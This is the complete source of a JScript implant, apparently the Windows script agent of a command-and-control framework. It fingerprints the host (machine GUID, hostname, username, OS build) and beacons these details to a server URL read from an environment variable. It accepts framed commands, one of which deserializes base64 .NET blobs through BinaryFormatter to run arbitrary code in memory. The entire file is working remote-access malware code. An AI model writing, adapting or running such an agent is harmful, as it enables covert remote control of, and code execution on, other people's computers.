function runAgent() {
    var CAN_ECHO = (typeof WScript != 'undefined');
    var shell = null, identityHeaders = null, exiting = false;
    var clrVersion = 'v4.0.30319';
    function ensureShell() {
        if (!shell) shell = new ActiveXObject('WScript.Shell');
    }
    function log(line) {
        if (CAN_ECHO) WScript.Echo(line);
        else if (typeof alert != 'undefined') alert(line);
        if (typeof dbg != 'undefined') dbg(line);
    }
    function readEnv(name) {
        ensureShell();
        var value = shell.ExpandEnvironmentStrings('%' + name + '%');
        return (value == '%' + name + '%') ? '' : value;
    }
    function u32Bytes(n) { return [n & 255, (n >>> 8) & 255, (n >>> 16) & 255, (n >>> 24) & 255]; }
    // ── v3 beacon framing (RAW BINARY bodies) ───────────────────────
    // The body is a stream of [u32le length][bytes] frames; one POST carries every
    // response owed since the last one, and the answer carries every queued
    // command (same contract as the C# agent — no encoding negotiation).
    //
    // JScript has no byte type, so ADODB.Stream is the COM bridge on both sides:
    //   SEND  — WriteText with Charset 'iso-8859-1' maps chars 0x00-0xFF to bytes
    //           1:1 (EMPIRICALLY VERIFIED: the WRITE direction is identity; only
    //           the read direction applies cp1252 — see below), then switch Type
    //           to 1 and hand the stream to xhr.send().
    //   READ  — Write(responseBody), then ReadText: MLang's 'iso-8859-1'/'windows-
    //           1252' READ decodes bytes 0x80-0x9F as their cp1252 Unicode chars
    //           (U+20AC etc); CP1252_INVERSE maps those 27 chars back to bytes.
    //           Everything else decodes 1:1. All 256 byte values round-trip
    //           (verified under cscript against a live HTTP listener).
    //   An EMPTY response body must NOT go through the stream (converting a
    //   zero-length stream throws) — gate on Content-Length first.
    function bytesToBinString(bytes) {
        var out = '', i;
        for (i = 0; i < bytes.length; i += 4096) {
            var chunk = '';
            for (var j = i; j < i + 4096 && j < bytes.length; j++) chunk += String.fromCharCode(bytes[j]);
            out += chunk;
        }
        return out;
    }
    function buildBodyStream(frames) {
        var text = '';
        for (var i = 0; i < frames.length; i++) {
            var f = frames[i];
            text += String.fromCharCode(f.length & 255, (f.length >>> 8) & 255, (f.length >>> 16) & 255, (f.length >>> 24) & 255);
            text += bytesToBinString(f);
        }
        var stream = new ActiveXObject('ADODB.Stream');
        stream.Type = 2;
        stream.Charset = 'iso-8859-1';
        stream.Open();
        stream.WriteText(text);
        stream.Position = 0;
        stream.Type = 1;
        return stream;
    }
    var CP1252_INVERSE = {
        0x20AC: 0x80, 0x201A: 0x82, 0x0192: 0x83, 0x201E: 0x84, 0x2026: 0x85, 0x2020: 0x86,
        0x2021: 0x87, 0x02C6: 0x88, 0x2030: 0x89, 0x0160: 0x8A, 0x2039: 0x8B, 0x0152: 0x8C,
        0x017D: 0x8E, 0x2018: 0x91, 0x2019: 0x92, 0x201C: 0x93, 0x201D: 0x94, 0x2022: 0x95,
        0x2013: 0x96, 0x2014: 0x97, 0x02DC: 0x98, 0x2122: 0x99, 0x0161: 0x9A, 0x203A: 0x9B,
        0x0153: 0x9C, 0x017E: 0x9E, 0x0178: 0x9F
    };
    function responseToBytes(body) {
        var stream = new ActiveXObject('ADODB.Stream');
        stream.Type = 1;
        stream.Open();
        stream.Write(body);
        stream.Position = 0;
        stream.Type = 2;
        stream.Charset = 'windows-1252';
        var text = stream.ReadText(-1);
        stream.Close();
        var bytes = [];
        for (var i = 0; i < text.length; i++) {
            var c = text.charCodeAt(i);
            bytes.push(CP1252_INVERSE[c] !== undefined ? CP1252_INVERSE[c] : (c & 255));
        }
        return bytes;
    }
    function parseFrames(bytes) {
        var frames = [], i = 0;
        while (i + 4 <= bytes.length) {
            var len = (bytes[i] | (bytes[i + 1] << 8) | (bytes[i + 2] << 16) | (bytes[i + 3] << 24)) >>> 0;
            i += 4;
            frames.push(bytes.slice(i, i + len));
            i += len;
        }
        return frames;
    }
    function base64ToStream(base64, byteLength) {
        var encoding = new ActiveXObject('System.Text.ASCIIEncoding');
        var encodedLength = encoding.GetByteCount_2(base64);
        var raw = encoding.GetBytes_4(base64);
        var decoder = new ActiveXObject('System.Security.Cryptography.FromBase64Transform');
        raw = decoder.TransformFinalBlock(raw, 0, encodedLength);
        var stream = new ActiveXObject('System.IO.MemoryStream');
        stream.Write(raw, 0, byteLength);
        stream.Position = 0;
        return stream;
    }
    var GUID_RE = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/;
    function loadGuid() {
        var guid = '';
        try { guid = ('' + shell.RegRead('HKLM\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid')).toLowerCase(); } catch (e) {}
        if (!GUID_RE.test(guid)) {
            // WScript.Shell can hit 32/64-bit registry redirection; use WMI StdRegProv as a fallback.
            try {
                var reg = new ActiveXObject('WbemScripting.SWbemLocator').ConnectServer('.', 'root\\default').Get('StdRegProv');
                var inParams = reg.Methods_.Item('GetStringValue').InParameters.SpawnInstance_();
                inParams.hDefKey = 0x80000002; // HKEY_LOCAL_MACHINE
                inParams.sSubKeyName = 'SOFTWARE\\Microsoft\\Cryptography';
                inParams.sValueName = 'MachineGuid';
                var outParams = reg.ExecMethod_('GetStringValue', inParams);
                if (outParams.ReturnValue == 0) guid = ('' + outParams.sValue).toLowerCase();
            } catch (e2) {}
        }
        if (!GUID_RE.test(guid)) {
            // Fall back to the SMBIOS hardware UUID; stable across OS reinstalls.
            try {
                var wmi = new ActiveXObject('WbemScripting.SWbemLocator').ConnectServer('.', 'root\\cimv2');
                var uuidQuery = new Enumerator(wmi.ExecQuery('SELECT UUID FROM Win32_ComputerSystemProduct'));
                for (; !uuidQuery.atEnd(); uuidQuery.moveNext()) {
                    var uuid = ('' + uuidQuery.item().UUID).toLowerCase();
                    if (GUID_RE.test(uuid)) guid = uuid;
                }
            } catch (e3) {}
        }
        return guid;
    }
    function buildIdentity() {
        var guid = loadGuid();
        var archMap = { AMD64: 'x86_64', x86: 'i386', ARM64: 'aarch64' };
        var archFromEnv = readEnv('PROCESSOR_ARCHITEW6432');
        if (!archFromEnv) archFromEnv = readEnv('PROCESSOR_ARCHITECTURE');
        var arch = archMap[archFromEnv] || archFromEnv || 'unknown';
        var processArch = archMap[readEnv('PROCESSOR_ARCHITECTURE')] || '';
        var osVersion = '', buildNumber = '', cpuArchCode = '';
        try {
            var wmi = new ActiveXObject('WbemScripting.SWbemLocator').ConnectServer('.', 'root\\cimv2');
            var osQuery = new Enumerator(wmi.ExecQuery('SELECT Version, BuildNumber FROM Win32_OperatingSystem'));
            for (; !osQuery.atEnd(); osQuery.moveNext()) { osVersion = '' + osQuery.item().Version; buildNumber = '' + osQuery.item().BuildNumber; }
            var cpuQuery = new Enumerator(wmi.ExecQuery('SELECT Architecture FROM Win32_Processor'));
            for (; !cpuQuery.atEnd(); cpuQuery.moveNext()) { cpuArchCode = '' + cpuQuery.item().Architecture; }
        } catch (e) {}
        arch = ({ '0': 'i386', '9': 'x86_64', '12': 'aarch64' })[cpuArchCode] || arch;
        var versionMatch = /^(\d+)\.(\d+)/.exec(osVersion);
        if (versionMatch) { if (versionMatch[1] == '6' && versionMatch[2] == '1') clrVersion = 'v2.0.50727'; }
        else if (buildNumber == '7600' || buildNumber == '7601') clrVersion = 'v2.0.50727';
        return [
            ['X-Agent-Api-Version', '1'],
            ['X-Agent-Uuid', guid],
            ['X-Agent-Hostname', readEnv('COMPUTERNAME')],
            ['X-Agent-Username', readEnv('USERNAME')],
            ['X-Agent-Arch', arch],
            ['X-Agent-Process-Arch', processArch],
            ['X-Agent-Platform', 'Windows'],
            ['X-Agent-Os-Version', osVersion],
            ['X-Agent-Build', buildNumber],
            ['X-Agent-Commit', ''],
            ['X-Agent-Name-Id', '1'],
            ['X-Agent-Bitness', (processArch == 'x86_64' || processArch == 'aarch64') ? '64' : '32'],
            ['X-Agent-Capabilities', '0800000000000000']
        ];
    }
    function dispatchCommand(bytes) {
        function base64Length(base64) {
            var padding = 0;
            if (base64.charAt(base64.length - 1) == '=') padding++;
            if (base64.charAt(base64.length - 2) == '=') padding++;
            return Math.floor(base64.length / 4) * 3 - padding;
        }
        if (bytes[0] == 10) { exiting = true; return null; }
        if (bytes[0] == 11) {
            try {
                var payloadText = '';
                for (var i = 1; i < bytes.length; i += 4096) {
                    var chunk = '';
                    for (var j = i; j < i + 4096 && j < bytes.length; j++) chunk += String.fromCharCode(bytes[j]);
                    payloadText += chunk;
                }
                var headerEnd = payloadText.indexOf('\n\n');
                var headerLines = (headerEnd >= 0 ? payloadText.substring(0, headerEnd) : '').split('\n');
                var bodyText = headerEnd >= 0 ? payloadText.substring(headerEnd + 2) : '';
                var stage1Split = bodyText.indexOf('\n');
                var stage1B64 = (stage1Split >= 0 ? bodyText.substring(0, stage1Split) : '').replace(/\s+/g, '');
                var blobB64 = (stage1Split >= 0 ? bodyText.substring(stage1Split + 1) : '').replace(/\s+/g, '');
                ensureShell();
                try { shell.Environment('Process')('COMPLUS_Version') = clrVersion; log('upgrade: COMPLUS_Version=' + clrVersion); } catch (e0) {}
                var driveMode = 0, entryPoint = '';
                for (var h = 0; h < headerLines.length; h++) {
                    var line = headerLines[h].replace(/\r$/, '');
                    if (line.length == 0) continue;
                    if (line.indexOf('!d=') == 0) driveMode = parseInt(line.substring(3), 10) || 0;
                    else if (line.indexOf('!e=') == 0) entryPoint = line.substring(3);
                    else {
                        var eqIndex = line.indexOf('=');
                        if (eqIndex > 0) { ensureShell(); shell.Environment('Process')('' + line.substring(0, eqIndex)) = '' + line.substring(eqIndex + 1); log('upgrade: set ' + line); }
                    }
                }
                log('upgrade: blob ' + blobB64.length + ' chars, stage1 ' + stage1B64.length + ' chars, drive ' + driveMode);
                if (stage1B64.length > 0) {
                    try { var stage1Formatter = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter'); stage1Formatter.Deserialize_2(base64ToStream(stage1B64, base64Length(stage1B64))); } catch (e1) { log('upgrade: stage1 threw (expected)'); }
                }
                var blobFormatter = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
                if (driveMode == 1) {
                    var invokeArgs = new ActiveXObject('System.Collections.ArrayList');
                    invokeArgs.Add(undefined);
                    blobFormatter.Deserialize_2(base64ToStream(blobB64, base64Length(blobB64))).DynamicInvoke(invokeArgs.ToArray()).CreateInstance(entryPoint);
                } else {
                    blobFormatter.Deserialize_2(base64ToStream(blobB64, base64Length(blobB64)));
                }
                log('upgrade: deserialize done');
                return u32Bytes(0);
            } catch (e) { log('upgrade failed: ' + (e && e.message ? e.message : e)); return u32Bytes(1); }
        }
        return u32Bytes(2);
    }
    ensureShell();
    var beaconUrl = readEnv('H_URL');
    if (!beaconUrl) { log('beacon endpoint not set'); return 'fail'; }
    identityHeaders = buildIdentity();
    log('JScript agent beaconing to ' + beaconUrl + ' as ' + identityHeaders[1][1]);
    var pendingReplies = [];
    while (!exiting) {
        var xhr = null;
        try {
            xhr = new ActiveXObject('MSXML2.ServerXMLHTTP');
            xhr.open('POST', beaconUrl, false);
            try { xhr.setProxy(1, '', ''); } catch (e2) {}
            xhr.setTimeouts(10000, 10000, 15000, 45000);
            for (var i = 0; i < identityHeaders.length; i++) {
                try { xhr.setRequestHeader(identityHeaders[i][0], identityHeaders[i][1]); } catch (e3) {}
            }
            log('POST start (' + pendingReplies.length + ' queued replies)');
            xhr.send(pendingReplies.length ? buildBodyStream(pendingReplies) : '');
            log('POST end, status ' + xhr.status);
        } catch (e) {
            log('beacon failed: ' + (e && e.message ? e.message : e));
            return 'fail';
        }
        if (xhr.status != 200) {
            log('http ' + xhr.status);
            return 'fail';
        }
        pendingReplies = [];
        // Empty answer = nothing queued — re-POST immediately. The stream conversion
        // of a zero-length body throws, so gate on Content-Length, never on ''-checks.
        if (parseInt(xhr.getResponseHeader('Content-Length') || '0', 10) == 0) { continue; }
        var frames = parseFrames(responseToBytes(xhr.responseBody));
        for (var f = 0; f < frames.length && !exiting; f++) {
            var replyBytes = dispatchCommand(frames[f]);
            if (exiting) { log('exit'); return 'exit'; }
            if (replyBytes) pendingReplies.push(replyBytes);
        }
    }
    return 'exit';
}
